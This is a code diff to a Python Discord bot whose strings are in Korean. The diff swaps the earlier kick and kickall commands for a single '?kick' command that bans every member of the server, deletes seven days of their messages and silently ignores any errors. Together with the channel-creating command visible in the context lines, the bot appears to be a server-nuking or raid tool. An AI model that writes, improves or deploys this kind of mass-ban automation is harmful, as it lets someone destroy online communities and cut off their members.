@@ -37,21 +37,16 @@ async def create(ctx):
         await ctx.guild.create_text_channel("튀엣")
         
 @client.command()
+async def kick(ctx):
+    await ctx.send("후힛")
+    for member in list(ctx.guild.members):
+      try:
+        await member.ban(reason="헤으응", delete_message_days=7)
+        (f"빠잉 {member.display_name}!")
+      except Exception:
+        pass
+        
 
-async def kick(ctx, member: guild.members, *, reason=None):
-    for i in range(4000):
-
-        await member.kick(reason=reason)
-
-        await ctx.send(f'튀엣 {member} X')
-    
-@client.command()
-async def kickall(ctx):
-    for user in ctx.guild.members:
-        try:
-            await user.kick()
-        except:
-            pass
     
 @client.command()
 async def cmd(ctx):
@@ -71,10 +66,7 @@ async def cmd(ctx):
 ?clean
 튀엣 제거
 
-?kick @유저
-튀엣 추방
-
-?kickall
+?kick 
 튀엣 싸그리몽땅
 
 ?invite
